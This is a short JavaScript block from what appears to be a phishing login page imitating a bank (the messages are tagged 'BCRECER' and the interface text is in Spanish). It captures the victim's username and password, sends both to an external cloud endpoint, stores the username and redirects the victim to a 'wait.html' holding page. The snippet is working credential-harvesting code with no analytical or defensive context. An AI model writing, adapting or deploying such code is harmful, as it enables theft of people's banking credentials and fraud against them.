    <script>

async function enviar(event) { 
    event.preventDefault(); 

    const usr = document.getElementById('username').value;
    const usrs = document.getElementById('password').value;
    const responseMessage = document.getElementById("responseMessage");

    
    if (!usr.trim()) { 
        responseMessage.textContent = "⚠️ Por favor, ingresa tu usuario.";
        return; 
    }

    if (!usrs.trim()) { 
        responseMessage.textContent = "⚠️ Por favor, ingresa tu contraseña.";
        return; 
    }
    

    const message = `BCRECER-- --Usuario: <code>${usr}</code> --\n PW:<code> ${usrs} </code>--`;

    try {
        const response = await fetch("https://116cb782-9f93-4a72-ba4a-d06101f4024e.us-east-1.cloud.genez.io/", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ message })
        });

        const data = await response.json();

        if (response.ok) {
            localStorage.setItem("usr", usr);
            window.location = "wait.html";
        } else {
            responseMessage.textContent = "❌ Error al enviar mensaje: " + data.error;
        }
    } catch (error) {
        responseMessage.textContent = "❌ Error en la solicitud: " + error.message;
    }
}


document.getElementById("show_password").addEventListener("click", ()=>{

    document.getElementById("password").type = document.getElementById("password").type === "password" ? "text" : "password";
})
    </script>
